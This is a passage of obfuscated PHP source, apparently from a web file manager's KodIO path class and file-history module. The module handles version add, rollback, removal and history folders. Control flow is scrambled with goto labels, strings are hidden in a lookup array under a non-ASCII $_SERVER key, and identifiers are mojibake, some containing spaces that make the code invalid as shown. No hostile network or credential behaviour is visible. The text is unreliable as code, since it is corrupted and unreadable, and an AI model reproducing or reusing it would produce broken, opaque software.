$dÂÂµ­…[$EƒÕÁâÀ‰[29]]; $aÈîßïî¥¶ = !$d•¢Ã˜«†° || $d•¢Ã˜«†° == KodIO::KOD_IO || $d•¢Ã˜«†° == KodIO::KOD_SHARE_ITEM; goto E÷ÑÃŒø¹‚; CÇ®õ¨Ãà„: } private static function pathHistory($bÉéºµÃ¥) { $FŞÂ·¶Öö =& $_SERVER[›èö’ù¤]; $CÚææÏø÷ = self::$_historyBase . ltrim(KodIO::clear($bÉéºµÃ¥), $FŞÂ·¶Öö[8]); $CÚææÏø÷ = str_replace(array($FŞÂ·¶Öö[1148]), array($FŞÂ·¶Öö[1149]), $CÚææÏø÷); return $CÚææÏø÷; } public static function log($aòäƒ¸¼›) { } public static function historyCount($fá”×Ç²¢) { $cƒ‡¨è²´Ì =& $_SERVER[›èö’ù¤]; $c‘²°œô« = array(); $aõ§•¼Ó’Ó = array(); foreach ($fá”×Ç²¢ as $cÖàæ¶¡í) { $c“×°–´„¼ = get_path_father($cÖàæ¶¡í); if (!$aõ§•¼Ó’Ó[$c“×°–´„¼]) { $aõ§•¼Ó’Ó[$c“×°–´„¼] = array(); } $aõ§•¼Ó’Ó[$c“×°–´„¼][] = get_path_this($cÖàæ¶¡í); } foreach ($aõ§•¼Ó’Ó as $c“×°–´„¼ => $bÎŸ¯í‚‰) { $fÂ¹¼ŠÖ ˜ = self::parsePath($c“×°–´„¼); if (!$fÂ¹¼ŠÖ ˜) { continue; } foreach ($bÎŸ¯í‚‰ as $böÇ¥¦½§) { $D¨¯Á ’³µ = self::listData(rtrim($fÂ¹¼ŠÖ ˜, $cƒ‡¨è²´Ì[8]) . $cƒ‡¨è²´Ì[8] . $böÇ¥¦½§, !1); if ($D¨¯Á ’³µ && $D¨¯Á ’³µ[$cƒ‡¨è²´Ì[367]]) { $c‘²°œô«[rtrim($c“×°–´„¼, $cƒ‡¨è²´Ì[8]) . $cƒ‡¨è²´Ì[8] . $böÇ¥¦½§] = count($D¨¯Á ’³µ[$cƒ‡¨è²´Ì[367]]); } } } return $c‘²°œô«; } public static function add($fÓƒ¿¦ÁÂï) { goto Eİ¸È®‹¦; aŠ‰ˆ„š¥·: $BğÂ‘À‡†Ÿ = array($a ¨Ã¦´¸[395] => $D†òÙğÛ†Ú, $a ¨Ã¦´¸[171] => $C°ã£¢¦ù, $a ¨Ã¦´¸[28] => $Aâˆ¼ÂÁ³[$a ¨Ã¦´¸[28]] . $a ¨Ã¦´¸[95] . date($a ¨Ã¦´¸[1152]) . rand_string(1), $a ¨Ã¦´¸[78] => $Aâˆ¼ÂÁ³[$a ¨Ã¦´¸[78]], $a ¨Ã¦´¸[447] => USER_ID, $a ¨Ã¦´¸[194] => time(), $a ¨Ã¦´¸[1153] => $a ¨Ã¦´¸[33]); IO::mkdir($f—ò†«ˆ›[$a ¨Ã¦´¸[1154]]); $aœÃÏ½ëÙì = IO::copy($fÓƒ¿¦ÁÂï, $f—ò†«ˆ›[$a ¨Ã¦´¸[1154]], !1, $BğÂ‘À‡†Ÿ[$a ¨Ã¦´¸[28]]); goto F°Î«Ó¬‘É; eËË¬Ë: if ($fĞƒõ§éã && $fĞƒõ§éã[0][$a ¨Ã¦´¸[171]] == $C°ã£¢¦ù) { return !0; } if (array_key_exists($a ¨Ã¦´¸[196], $Aâˆ¼ÂÁ³) && !$Aâˆ¼ÂÁ³[$a ¨Ã¦´¸[196]]) { return !1; } $D†òÙğÛ†Ú = short_id(time()); goto aŠ‰ˆ„š¥·; CäÇ¼«Â‚ˆ: return self::saveData($f—ò†«ˆ›[$a ¨Ã¦´¸[1155]], $fĞƒõ§éã); goto d²÷Ë³ï©; bË »§â•ö: if ($FÖì¿¦´‡È <= 0) { return; } $C°ã£¢¦ù = IO::hashSimple($fÓƒ¿¦ÁÂï); $Aâˆ¼ÂÁ³ = IO::info($fÓƒ¿¦ÁÂï); goto FÚ¶„ñâ¹ñ; Eİ¸È®‹¦: $a ¨Ã¦´¸ =& $_SERVER[›èö’ù¤]; $f—ò†«ˆ› = self::listData($fÓƒ¿¦ÁÂï); if (!$f—ò†«ˆ›) { return; } goto DÑÓà—Œˆî; FÚ¶„ñâ¹ñ: $fĞƒõ§éã = $f—ò†«ˆ›[$a ¨Ã¦´¸[367]]; if ($Aâˆ¼ÂÁ³[$a ¨Ã¦´¸[78]] == 0) { return; } if ($Aâˆ¼ÂÁ³[$a ¨Ã¦´¸[78]] >= 1024 * 1024 * 500) { return !1; } goto eËË¬Ë; F°Î«Ó¬‘É: if (!$aœÃÏ½ëÙì) { self::clearEmptyFolder($f—ò†«ˆ›[$a ¨Ã¦´¸[1154]]); return !1; } array_unshift($fĞƒõ§éã, $BğÂ‘À‡†Ÿ); if (count($fĞƒõ§éã) > $dîõÊˆ) { $føŠ¢‘¦Êâ = array_slice($fĞƒõ§éã, $dîõÊˆ); foreach ($føŠ¢‘¦Êâ as $Bã“©†¯å¶) { IO::remove($f—ò†«ˆ›[$a ¨Ã¦´¸[1154]] . $Bã“©†¯å¶[$a ¨Ã¦´¸[28]]); } $fĞƒõ§éã = array_slice($fĞƒõ§éã, 0, $dîõÊˆ); } goto CäÇ¼«Â‚ˆ; DÑÓà—Œˆî: $Eó¥Í°ÏÒá = Model($a ¨Ã¦´¸[754])->get($a ¨Ã¦´¸[1150]); $FÖì¿¦´‡È = $GLOBALS[$a ¨Ã¦´¸[6]][$a ¨Ã¦´¸[88]][$a ¨Ã¦´¸[1128]]; $dîõÊˆ = $Eó¥Í°ÏÒá == $a ¨Ã¦´¸[1151] ? 5 : $FÖì¿¦´‡È; goto bË »§â•ö; d²÷Ë³ï©: } public static function remove($BÕÖ¯±ì‰´, $A¢©•ì•éÃ) { $Dé¾¬‚ƒ›‹ =& $_SERVER[›èö’ù¤]; $a ´ç¼ß­ = self::listData($BÕÖ¯±ì‰´); $D°ÔàœÜÛ = array(); if (!$a ´ç¼ß­) { return !1; } foreach ($a ´ç¼ß­[$Dé¾¬‚ƒ›‹[367]] as $bÏã“ˆîŒÕ) { if ($bÏã“ˆîŒÕ[$Dé¾¬‚ƒ›‹[395]] == $A¢©•ì•éÃ) { IO::remove($a ´ç¼ß­[$Dé¾¬‚ƒ›‹[1154]] . $bÏã“ˆîŒÕ[$Dé¾¬‚ƒ›‹[28]]); continue; } $D°ÔàœÜÛ[] = $bÏã“ˆîŒÕ; } return self::saveData($a ´ç¼ß­[$Dé¾¬‚ƒ›‹[1155]], $D°ÔàœÜÛ); } public static function clear($b³×¨ÙõÑ¬, $Fš‚à†Õä¼ = true) { $eˆº¿áã˜¿ =& $_SERVER[›èö’ù¤]; $EğÉé‚ÇÑ = self::listData($b³×¨ÙõÑ¬, $Fš‚à†Õä¼); if (!$EğÉé‚ÇÑ) { return !1; } foreach ($EğÉé‚ÇÑ[$eˆº¿áã˜¿[367]] as $f’âÀïİøã) { IO::remove($EğÉé‚ÇÑ[$eˆº¿áã˜¿[1154]] . $f’âÀïİøã[$eˆº¿áã˜¿[28]]); } return self::saveData($EğÉé‚ÇÑ[$eˆº¿áã˜¿[1155]], array()); } public static function moveHistory($eà†íÊ ìÒ, $B„¢è½ë–± = '', $e°ŠİÖÒáë = '') { goto f¯ˆŠ•À×ô; f¯ˆŠ•À×ô: $eÙ¢Æ‘•’è =& $_SERVER[›èö’ù¤]; $BÕÎ¤…Û† = self::listData($eà†íÊ ìÒ, !1); if (!$BÕÎ¤…Û† || !$BÕÎ¤…Û†[$eÙ¢Æ‘•’è[367]]) { return !1; } goto dªñáñ¤¨; dªñáñ¤¨: $fèìƒöÀ¡› = $eÙ¢Æ‘•’è[1142]; $B„¢è½ë–± = $B„¢è½ë–± ? $B„¢è½ë–± : get_path_this($eà†íÊ ìÒ); $e°ŠİÖÒáë = $e°ŠİÖÒáë ? $e°ŠİÖÒáë : $BÕÎ¤…Û†[$eÙ¢Æ‘•’è[1154]]; goto b†§â—Œ÷; f¶Å’êØ‹˜: self::saveData($BÕÎ¤…Û†[$eÙ¢Æ‘•’è[1155]], $BÕÎ¤…Û†[$eÙ¢Æ‘•’è[367]]); self::clearEmptyFolder($BÕÎ¤…Û†[$eÙ¢Æ‘•’è[1154]]); goto b¾ÈÒŒ£ìÒ; b†§â—Œ÷: $dŸÜƒ…Üª– = substr(get_path_this($BÕÎ¤…Û†[$eÙ¢Æ‘•’è[1155]]), 0, -strlen($fèìƒöÀ¡›)); foreach ($BÕÎ¤…Û†[$eÙ¢Æ‘•’è[367]] as $eŒê‚ˆì‹¼ => $F„Ñ“êß”ä) { $cÌÙâÈ½×© = $B„¢è½ë–± . substr($F„Ñ“êß”ä[$eÙ¢Æ‘•’è[28]], strlen($dŸÜƒ…Üª–)); $Aƒ»¢¹Ú¸¦ = IO::move($BÕÎ¤…Û†[$eÙ¢Æ‘•’è[1154]] . $F„Ñ“êß”ä[$eÙ¢Æ‘•’è[28]], $e°ŠİÖÒáë, !1, $cÌÙâÈ½×©); if ($Aƒ»¢¹Ú¸¦) { $BÕÎ¤…Û†[$eÙ¢Æ‘•’è[367]][$eŒê‚ˆì‹¼][$eÙ¢Æ‘•’è[28]] = $cÌÙâÈ½×©; } } $BÕÎ¤…Û†[$eÙ¢Æ‘•’è[1155]] = IO::move($BÕÎ¤…Û†[$eÙ¢Æ‘•’è[1155]], $e°ŠİÖÒáë, !1, $B„¢è½ë–± . $fèìƒöÀ¡›); goto f¶Å’êØ‹˜; b¾ÈÒŒ£ìÒ: } public static function rollback($A÷ÒöºÑ­, $A­ƒíÓ°) { $fåÙÚª¬ã¶ =& $_SERVER[›èö’ù¤]; $Døï‚¦Öß = self::listData($A÷ÒöºÑ­); if (!$Døï‚¦Öß) { return; } $eÄºùÊÙ¥Ğ = IO::info($A÷ÒöºÑ­); foreach ($Døï‚¦Öß[$fåÙÚª¬ã¶[367]] as $dÜøÔˆ‹¸ => $a»ÃĞ‘è÷) { if ($a»ÃĞ‘è÷[$fåÙÚª¬ã¶[395]] == $A­ƒíÓ°) { self::add($A÷ÒöºÑ­); $Dè§¶á‚â = $Døï‚¦Öß[$fåÙÚª¬ã¶[1154]] . $a»ÃĞ‘è÷[$fåÙÚª¬ã¶[28]]; $eÎ‘ô”ëÉ = IO::copy($Dè§¶á‚â, IO::pathFather($A÷ÒöºÑ­), REPEAT_REPLACE, $eÄºùÊÙ¥Ğ[$fåÙÚª¬ã¶[28]]); if ($eÎ‘ô”ëÉ) { self::remove($A÷ÒöºÑ­, $A­ƒíÓ°); } return $eÎ‘ô”ëÉ; } } return !1; } public static function setDetail($EÛª·Ê£´š, $Cæ·ºÙöÔÄ, $CâĞ˜ï¶Ü“) { $AÁ ÕÃÉ½ =& $_SERVER[›èö’ù¤]; $däîŠØ ¡ = self::listData($EÛª·Ê£´š); if (!$däîŠØ ¡) { return; } foreach ($däîŠØ ¡[$AÁ ÕÃÉ½[367]] as $cßÀÕµ¥ => $f‡«Â´ÑÓù) { if ($f‡«Â´ÑÓù[$AÁ ÕÃÉ½[395]] == $Cæ·ºÙöÔÄ) { $däîŠØ ¡[$AÁ ÕÃÉ½[367]][$cßÀÕµ¥][$AÁ ÕÃÉ½[1153]] = $CâĞ˜ï¶Ü“; self::saveData($däîŠØ ¡[$AÁ ÕÃÉ½[1155]], $däîŠØ ¡[$AÁ ÕÃÉ½[367]]); return !0; } } return !1; } public static function fileInfo($cÑ‡ÎÛ¾°, $BÉËäÖ»Ÿè) { goto Aù”´‚î»‡; aÛá¡Õ²¹: $CÆ¤–ˆÁÕ = $dİµÒáë«¤[33]; foreach ($d¨×§§Œøê[$dİµÒáë«¤[367]] as $Eó¦ÕÃëíã => $eéÍ†›éí) { if ($eéÍ†›éí[$dİµÒáë«¤[395]] != $BÉËäÖ»Ÿè) { continue; } $CÆ¤–ˆÁÕ = $d¨×§§Œøê[$dİµÒáë«¤[1154]] . $eéÍ†›éí[$dİµÒáë«¤[28]]; break; } if (!$CÆ¤–ˆÁÕ) { show_json(LNG($dİµÒáë«¤[105]), !1); } goto b½’ŒÍ‹ôª; b½’ŒÍ‹ôª: return IO::info($CÆ¤–ˆÁÕ); goto a…çÒéÙóÎ; Aù”´‚î»‡: $dİµÒáë«¤ =& $_SERVER[›èö’ù¤]; $d¨×§§Œøê = self::listData($cÑ‡ÎÛ¾°); if (!$d¨×§§Œøê) { show_json(LNG($dİµÒáë«¤[105]), !1); } goto aÛá¡Õ²¹; a…çÒéÙóÎ: } public static function fileOut($CÏÌ¬Ô…§, $C¥µ±Ë¶¹”, $Eó—ğ­ğî = false) { $báÌÛâ¥â¾ =& $_SERVER[›èö’ù¤]; $f½Óí–­ÌŠ = self::fileInfo($CÏÌ¬Ô…§, $C¥µ±Ë¶¹”); $aÑ÷Œİ°ã° =& $GLOBALS[$báÌÛâ¥â¾[7]]; $Eó—ğ­ğî = isset($aÑ÷Œİ°ã°[$báÌÛâ¥â¾[1118]]) && $aÑ÷Œİ°ã°[$báÌÛâ¥â¾[1118]] == 1; if (isset($aÑ÷Œİ°ã°[$báÌÛâ¥â¾[29]]) && $aÑ÷Œİ°ã°[$báÌÛâ¥â¾[29]] == $báÌÛâ¥â¾[1156]) { return IO::fileOutImage($f½Óí–­ÌŠ[$báÌÛâ¥â¾[76]], $aÑ÷Œİ°ã°[$báÌÛâ¥â¾[1157]]); } IO::fileOut($f½Óí–­ÌŠ[$báÌÛâ¥â¾[76]], $Eó—ğ­ğî, get_path_this($CÏÌ¬Ô…§)); } public static function listData($dßæ£Ã·áæ, $C£®˜ƒÎ = true) { goto bµÎ‹ŠÑ; bµÎ‹ŠÑ: $F„Ÿª¦äíİ =& $_SERVER[›èö’ù¤]; if ($C£®˜ƒÎ && !IO::exist($dßæ£Ã·áæ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto cõ¿È¦ğ³; cõ¿È¦ğ³: if (substr($dßæ£Ã·áæ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $C ˆ±‘ƒôï = self::pathHistory($dßæ£Ã·áæ); $d—˜Ìõ¾…Â = array($F„Ÿª¦äíİ[1155] => $C ˆ±‘ƒôï . $F„Ÿª¦äíİ[1142], $F„Ÿª¦äíİ[1154] => rtrim(get_path_father($C ˆ±‘ƒôï), $F„Ÿª¦äíİ[8]) . $F„Ÿª¦äíİ[8], $F„Ÿª¦äíİ[367] => array()); goto Fó¢Ş‡‚Š; Fó¢Ş‡‚Š: $DÇß‡Ì‚¸¦ = IO::getContent($d—˜Ìõ¾…Â[$F„Ÿª¦äíİ[1155]]); if ($DÇß‡Ì‚¸¦) { $C†ôØß¦ª­ = json_decode($DÇß‡Ì‚¸¦, !0); if (is_array($C†ôØß¦ª­)) { $d—˜Ìõ¾…Â[$F„Ÿª¦äíİ[367]] = $C†ôØß¦ª­; } } return $d—˜Ìõ¾…Â; goto CºÈíš¿˜; CºÈíš¿˜: } private static function saveData($A×ŸÏŸñ ‹, $e˜ÏÖõÓØò) { goto f„ñğ³…²¯; dÄ¸Å•±ã: $b¦ã³Û†Â = IO::pathFather($A×ŸÏŸñ ‹); IO::remove($A×ŸÏŸñ ‹); self::clearEmptyFolder($b¦ã³Û†Â); goto BµƒÈËÆ; f„ñğ³…²¯: $d• ³î‚¿ï =& $_SERVER[›èö’ù¤]; self::log($d• ³î‚¿ï[1158] . $A×ŸÏŸñ ‹ . $d• ³î‚¿ï[68] . count($e˜ÏÖõÓØò), $d• ³î‚¿ï[736]); if ($e˜ÏÖõÓØò) { return IO::setContent($A×ŸÏŸñ ‹, json_encode($e˜ÏÖõÓØò)); } goto dÄ¸Å•±ã; BµƒÈËÆ: return !0; goto e±ÊÏÇ¨°; e±ÊÏÇ¨°: } public static function clearEmptyFolder($FõÕ¢¬ ªê) { goto AÇÃÀ¶ó½; dòí°±Çöš: self::clearEmptyFolder($f„÷²œ›Œæ); goto C…ƒ•ÄÂæ¥; AÇÃÀ¶ó½: $b³¬ßáëŞ‘ =& $_SERVER[›èö’ù¤]; if (trim($FõÕ¢¬ ªê, $b³¬ßáëŞ‘[8]) == trim(self::$_historyBase, $b³¬ßáëŞ‘[8])) { return; } $f„÷²œ›Œæ = IO::pathFather($FõÕ¢¬ ªê); goto Cïášª¶³; Cïášª¶³: $C³×îŸŸ‚› = IO::has($FõÕ¢¬ ªê, !0); if ($C³×îŸŸ‚›[$b³¬ßáëŞ‘[203]] > 0 || $C³×îŸŸ‚›[$b³¬ßáëŞ‘[204]] > 0) { return; } IO::remove($FõÕ¢¬ ªê); goto dòí°±Çöš; C…ƒ•ÄÂæ¥: } private static function getBasePath() { goto AèÔ½‡ŠŠ; fÛµÄĞ×†ë: return $cñ ó°¶ ò; goto E¸¡ƒ’åÅù; Fİç¬æĞÎË: file_put_contents($cñ ó°¶ ò . $BïŒñØËë°[1162], $BïŒñØËë°[33]); file_put_contents(DATA_PATH . $BïŒñØËë°[1162], $BïŒñØËë°[33]); Model($BïŒñØËë°[1159])->set($BïŒñØËë°[1160], $cñ ó°¶ ò); goto fÛµÄĞ×†ë; AèÔ½‡ŠŠ: $BïŒñØËë° =& $_SERVER[›èö’ù¤]; $cñ ó°¶ ò = Model($BïŒñØËë°[1159])->get($BïŒñØËë°[1160]); if ($cñ ó°¶ ò) { if (!IO::exist($cñ ó°¶ ò)) { IO::mkdir($cñ ó°¶ ò); } if (get_path_this($cñ ó°¶ ò) == $BïŒñØËë°[1145]) { $c™‰Ê—ÉÁ® = $BïŒñØËë°[1161] . rand_string(8); @rename($cñ ó°¶ ò, get_path_father($cñ ó°¶ ò) . $BïŒñØËë°[8] . $c™‰Ê—ÉÁ®); $cñ ó°¶ ò = DATA_PATH . $c™‰Ê—ÉÁ® . $BïŒñØËë°[8]; file_put_contents(DATA_PATH . $BïŒñØËë°[1162], $BïŒñØËë°[33]); Model($BïŒñØËë°[1159])->set($BïŒñØËë°[1160], $cñ ó°¶ ò); } return $cñ ó°¶ ò; } goto eƒøÖ¨®‚›; eƒøÖ¨®‚›: $cñ ó°¶ ò = DATA_PATH . $BïŒñØËë°[1161] . rand_string(8) . $BïŒñØËë°[8]; $cñ ó°¶ ò = IO::mkdir($cñ ó°¶ ò); $cñ ó°¶ ò = rtrim($cñ ó°¶ ò, $BïŒñØËë°[8]) . $BïŒñØËë°[8]; goto Fİç¬æĞÎË; E¸¡ƒ’åÅù: } } class KodIO { const KOD_SOURCE = "\x7b\163\x6f\165\x72\x63\145\x7d"; const KOD_USER_RECYCLE = "\x7b\165\x73\145\x72\x52\145\x63\171\143\154\x65\x7d"; const KOD_USER_FAV = "\173\x75\x73\x65\x72\x46\141\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\163\x65\x72\106\x69\x6c\x65\x54\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\163\x65\162\106\151\154\145\x54\171\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\157\x75\x70\122\157\x6f\x74\x53\145\x6c\146\175"; const KOD_USER_SHARE = "\173\165\x73\145\162\x53\x68\x61\162\145\175"; const KOD_USER_SHARE_LINK = "\173\x75\x73\x65\x72\123\x68\141\162\x65\114\x69\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\141\x72\145\124\x6f\115\145\175"; const KOD_SHARE_ITEM = "\173\163\x68\x61\162\x65\111\x74\145\155\175"; const KOD_SHARE_LINK = "\x7b\x73\x68\x61\162\x65\x49\164\x65\155\114\151\156\x6b\175"; const KOD_SEARCH = "\x7b\163\145\141\x72\143\150\x7d"; const KOD_BLOCK = "\173\142\x6c\x6f\x63\153\175"; const KOD_IO = "\173\x69\157\x7d"; const KOD_USER_RECENT = "\173\x75\x73\x65\x72\122\x65\156\143\145\156\164\175"; const KOD_USER_DRIVER = "\173\x64\x72\x69\x76\x65\x72\175"; public static function typeList() { $a£ÁäÌªŠ  =& $_SERVER[›èö’ù¤]; return array($a£ÁäÌªŠ [1163] => self::KOD_SOURCE, $a£ÁäÌªŠ [1164] => self::KOD_USER_RECYCLE, $a£ÁäÌªŠ [1165] => self::KOD_USER_FAV, $a£ÁäÌªŠ [1166] => self::KOD_USER_FILE_TAG, $a£ÁäÌªŠ [1167] => self::KOD_USER_FILE_TYPE, $a£ÁäÌªŠ [1168] => self::KOD_GROUP_ROOT_SELF, $a£ÁäÌªŠ [1169] => self::KOD_USER_SHARE, $a£ÁäÌªŠ [1170] => self::KOD_USER_SHARE_LINK, $a£ÁäÌªŠ [1171] => self::KOD_USER_SHARE_TO_ME, $a£ÁäÌªŠ [1172] => self::KOD_SHARE_ITEM, $a£ÁäÌªŠ [1173] => self::KOD_SHARE_LINK, $a£ÁäÌªŠ [1174] => self::KOD_SEARCH, $a£ÁäÌªŠ [1175] => self::KOD_BLOCK, $a£ÁäÌªŠ [1176] => self::KOD_IO, $a£ÁäÌªŠ [1177] => self::KOD_USER_RECENT, $a£ÁäÌªŠ [1178] => self::KOD_USER_DRIVER); } public static function parse($a¼ÇéãƒË) { goto d…ğîÙ©; d…ğîÙ©: $CâÎ¢ƒ¡—ã =& $_SERVER[›èö’ù¤]; $a¼ÇéãƒË = self::clear($a¼ÇéãƒË); $b‡¥…“ñÏÇ = array_values(self::typeList()); goto d¸é­öˆ¶Û; d¸é­öˆ¶Û: preg_match($CâÎ¢ƒ¡—ã[1179], $a¼ÇéãƒË, $CÂ¯àõÚº¢); $c™ì¹¤”ô = array($CâÎ¢ƒ¡—ã[417] => !1, $CâÎ¢ƒ¡—ã[1180] => !1, $CâÎ¢ƒ¡—ã[414] => !1, $CâÎ¢ƒ¡—ã[76] => $a¼ÇéãƒË, $CâÎ¢ƒ¡—ã[1089] => !1, $CâÎ¢ƒ¡—ã[1088] => $CâÎ¢ƒ¡—ã[33]); if (is_array($CÂ¯àõÚº¢) && count($CÂ¯àõÚº¢) == 5) { $dÒ°ÓÚ‡ùÊ = $CâÎ¢ƒ¡—ã[1181] . $CÂ¯àõÚº¢[2] . $CâÎ¢ƒ¡—ã[325]; if (in_array($dÒ°ÓÚ‡ùÊ, $b‡¥…“ñÏÇ)) { $c™ì¹¤”ô[$CâÎ¢ƒ¡—ã[1089]] = $CÂ¯àõÚº¢[1]; $c™ì¹¤”ô[$CâÎ¢ƒ¡—ã[29]] = $dÒ°ÓÚ‡ùÊ; $c™ì¹¤”ô[$CâÎ¢ƒ¡—ã[1182]] = substr($dÒ°ÓÚ‡ùÊ, 1, -1); $c™ì¹¤”ô[$CâÎ¢ƒ¡—ã[395]] = $CÂ¯àõÚº¢[3]; } $c™ì¹¤”ô[$CâÎ¢ƒ¡—ã[1088]] = $CÂ¯àõÚº¢[4]; } goto C£²‘á•„; C£²‘á•„: $E¥ÁŠÏ¢¶¯ = array($CâÎ¢ƒ¡—ã[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $c™ì¹¤”ô[$CâÎ¢ƒ¡—ã[1144]] = in_array($c™ì¹¤”ô[$CâÎ¢ƒ¡—ã[29]], $E¥ÁŠÏ¢¶¯); return $c™ì¹¤”ô; goto f¤Í…˜ö²; f¤Í…˜ö²: } public static function isTruePath($C‘İé…Œèõ) { goto Cñƒ¢îç‘ö; Cñƒ¢îç‘ö: $D¤Œ¯ÓÒÈ =& $_SERVER[›èö’ù¤]; if (substr($C‘İé…Œèõ, 0, 1) != $D¤Œ¯ÓÒÈ[1181]) { return !0; } if (strpos($C‘İé…Œèõ, $D¤Œ¯ÓÒÈ[403]) === 0) { return !0; } goto dÕÏŞ·Œ¦ù; B»¶´•„š“: if (strpos($C‘İé…Œèõ, $D¤Œ¯ÓÒÈ[1185]) === 0) { return !0; } return !1; goto E„ ‰±æÖÆ; dÕÏŞ·Œ¦ù: if (strpos($C‘İé…Œèõ, $D¤Œ¯ÓÒÈ[1148]) === 0) { return !0; } if (strpos($C‘İé…Œèõ, $D¤Œ¯ÓÒÈ[1183]) === 0) { return !0; } if (strpos($C‘İé…Œèõ, $D¤Œ¯ÓÒÈ[1184]) === 0) { return !0; } goto B»¶´•„š“; E„ ‰±æÖÆ: } public static function clear($a‘İ‹á§Ÿ«) { goto B‚ó»òÉ‚; f¹îù“¯”ˆ: $a‘İ‹á§Ÿ« = preg_replace($D¤¯ë¾Ñ©š[1188], $D¤¯ë¾Ñ©š[8], $a‘İ‹á§Ÿ«); if ($a‘İ‹á§Ÿ« == $D¤¯ë¾Ñ©š[8]) { return $D¤¯ë¾Ñ©š[8]; } $a‘İ‹á§Ÿ« = rtrim($a‘İ‹á§Ÿ«, $D¤¯ë¾Ñ©š[8]); goto E§è»„ã©; B‚ó»òÉ‚: $D¤¯ë¾Ñ©š =& $_SERVER[›èö’ù¤]; $a‘İ‹á§Ÿ« = str_replace(array($D¤¯ë¾Ñ©š[1062], $D¤¯ë¾Ñ©š[229]), $D¤¯ë¾Ñ©š[50], $a‘İ‹á§Ÿ«); $a‘İ‹á§Ÿ« = str_replace($D¤¯ë¾Ñ©š[97], $D¤¯ë¾Ñ©š[8], $a‘İ‹á§Ÿ«); goto Cù•¦œß—¬; E§è»„ã©: return $a‘İ‹á§Ÿ«; goto C´¡ª™Ú; Cù•¦œß—¬: $DÌÒªÌĞÈà = $D¤¯ë¾Ñ©š[1186]; if (substr($a‘İ‹á§Ÿ«, 0, 3) == $D¤¯ë¾Ñ©š[1187]) { $a‘İ‹á§Ÿ« = substr($a‘İ‹á§Ÿ«, 3); } while (strstr($a‘İ‹á§Ÿ«, $DÌÒªÌĞÈà)) { $a‘İ‹á§Ÿ« = str_replace($DÌÒªÌĞÈà, $D¤¯ë¾Ñ©š[8], $a‘İ‹á§Ÿ«); } goto f¹îù“¯”ˆ; C´¡ª™Ú: } public static function sourceID($Dœ¤¶Ÿì–œ) { $d¥™Ê Êˆ =& $_SERVER[›èö’ù¤]; $b‡½Óøí‡² = self::parse($Dœ¤¶Ÿì–œ); if ($b‡½Óøí‡²[$d¥™Ê Êˆ[29]] !== self::KOD_SOURCE) { show_json(LNG($d¥™Ê Êˆ[1189]), !1); } return $b‡½Óøí‡²[$d¥™Ê Êˆ[395]]; } public static function make($Dí‡’Ï‚‡†) { if (!$Dí‡’Ï‚‡†) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Dí‡’Ï‚‡†)); } public static function makeShare($bóŠ«Õë“Ç, $d±ì´–­™) { return self::makePath(self::KOD_SHARE_ITEM, $bóŠ«Õë“Ç, $d±ì´–­™); } public static function makeFileTypePath($c¥ËÔ…‘Œë) { return self::makePath(self::KOD_USER_FILE_TYPE, $c¥ËÔ…‘Œë); } public static function makeFileTagPath($EÃ„Â‚®’“) { return self::makePath(self::KOD_USER_FILE_TAG, $EÃ„Â‚®’“); } public static function makePath($C‹¢¿Ë¯‘¿, $F“Ñ³±Ù»æ = '', $Bï§§ƒ–¯ = '') { $B¯¯ğ‡˜‰Û =& $_SERVER[›èö’ù¤]; $EÖ„ò¤ÕÂÜ = substr($C‹¢¿Ë¯‘¿, 1, -1); $a¯‰ŞšÛÇ = $B¯¯ğ‡˜‰Û[1190] . $EÖ„ò¤ÕÂÜ . $B¯¯ğ‡˜‰Û[1191] . $F“Ñ³±Ù»æ . $B¯¯ğ‡˜‰Û[1192]; $a¯‰ŞšÛÇ = $Bï§§ƒ–¯ ? $a¯‰ŞšÛÇ . $Bï§§ƒ–¯ . $B¯¯ğ‡˜‰Û[8] : $a¯‰ŞšÛÇ; return $a¯‰ŞšÛÇ; } public static function hashPath($Bİ˜ËãÍœ, $aÌÙÎµá½ = true) { goto A¥¥ä‡”à; DÂÇ¢‡ÁÌ: return $dèØˆŠÅËŒ; goto E¢ ñÈ’ŒÌ; cèİ¹øß¥²: if (!$dèØˆŠÅËŒ && isset($cŸ×¤ïÁÜÆ[$E‡¡µè½«Ğ[397]])) { $cŸ×¤ïÁÜÆ = IO::info(KodIO::make($cŸ×¤ïÁÜÆ[$E‡¡µè½«Ğ[397]])); $dèØˆŠÅËŒ = _get($cŸ×¤ïÁÜÆ, $E‡¡µè½«Ğ[1193], $E‡¡µè½«Ğ[33]); } if (!$dèØˆŠÅËŒ && $aÌÙÎµá½) { $c‘ïèŞ¦ÖÃ = KodIO::parse($cŸ×¤ïÁÜÆ[$E‡¡µè½«Ğ[76]]); if (!$c‘ïèŞ¦ÖÃ[$E‡¡µè½«Ğ[29]]) { $dèØˆŠÅËŒ = IO::hashSimple($cŸ×¤ïÁÜÆ[$E‡¡µè½«Ğ[76]]); } } if (!$dèØˆŠÅËŒ) { $dèØˆŠÅËŒ = md5($cŸ×¤ïÁÜÆ[$E‡¡µè½«Ğ[76]] . $cŸ×¤ïÁÜÆ[$E‡¡µè½«Ğ[78]] . $cŸ×¤ïÁÜÆ[$E‡¡µè½«Ğ[84]]); } goto DÂÇ¢‡ÁÌ; A¥¥ä‡”à: $E‡¡µè½«Ğ =& $_SERVER[›èö’ù¤]; $cŸ×¤ïÁÜÆ = is_array($Bİ˜ËãÍœ) ? $Bİ˜ËãÍœ : IO::info($Bİ˜ËãÍœ); $dèØˆŠÅËŒ = _get($cŸ×¤ïÁÜÆ, $E‡¡µè½«Ğ[1193], $E‡¡µè½«Ğ[33]); goto cèİ¹øß¥²; E¢ ñÈ’ŒÌ: } public static function initSystemPath() { goto bñÎÛó; AâË±ÔÎ²: IOHistory::bindEvent(); goto AĞµÖ©ğ‹È; EóÍÖ¾‚ë‡: define($dŸ‹ŞÁ³´å[1196], self::systemPath($dŸ‹ŞÁ³´å[1197])); define($dŸ‹ŞÁ³´å[1198], self::systemPath($dŸ‹ŞÁ³´å[1199])); define($dŸ‹ŞÁ³´å[1200], self::systemPath($dŸ‹ŞÁ³´å[1201])); goto AâË±ÔÎ²; bñÎÛó: 